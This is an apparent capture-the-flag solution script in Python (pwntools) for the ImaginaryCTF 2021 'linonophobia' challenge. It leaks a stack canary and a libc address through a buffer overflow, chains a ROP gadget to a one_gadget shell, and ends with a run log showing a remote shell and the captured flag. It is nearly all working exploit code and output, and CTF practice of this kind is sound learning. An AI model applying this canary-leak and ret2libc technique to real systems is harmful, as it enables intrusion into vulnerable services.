from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './linonophobia'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42006
  s = remote(HOST, PORT)
  start_addr = 0x4005d0
else:
  #s = process(BINARY)
  s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  start_addr = elf.sym._start
libc = elf.libc


pop_rdi_ret = 0x401353

s.recvuntil("wElCoMe tO mY sErVeR!\n")
s.sendline("A"*0x108)

s.recvuntil("A"*0x108)
canary = u64(s.recv(8)) - 0xa
print("canary =", hex(canary))

buf  = b"A"*0x108
buf += p64(canary)
buf += b"\x00"*8
buf += p64(start_addr)
s.sendline(buf)

s.recvuntil("wElCoMe tO mY sErVeR!\n")
s.sendline("A"*0x117)

s.recvuntil("A"*0x117+"\n")
libc_leak = u64(s.recv(6)+b"\x00\x00")
libc_base = libc_leak - 0x270b3
pop_rdx_rbx_ret = libc_base + 0x162866 # pop rdx; pop rbx; ret;
one_gadget = libc_base + 0xe6c81
print("libc_leak =", hex(libc_leak ))
print("libc_base =", hex(libc_base))

buf  = b"A"*0x108
buf += p64(canary)
buf += b"\x00"*8
buf += p64(pop_rdx_rbx_ret)
buf += p64(0)*2  # rdx = 0
buf += p64(one_gadget)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200$ python3 solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_linonophobia_200/linonophobia'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.imaginaryctf.org on port 42006: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
canary = 0x24952fa8f3080800
libc_leak = 0x7f44e2ccd0b3
libc_base = 0x7f44e2ca6000
[*] Switching to interactive mode

$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 20
-rwxr--r-- 1 nobody nogroup    44 Jul 19 23:03 flag.txt
-rwxr-xr-x 1 nobody nogroup 12784 Jul 24 13:19 run
$ cat flag.txt
ictf{str1ngs_4r3_null_t3rm1n4t3d!_b421ba9f}
'''
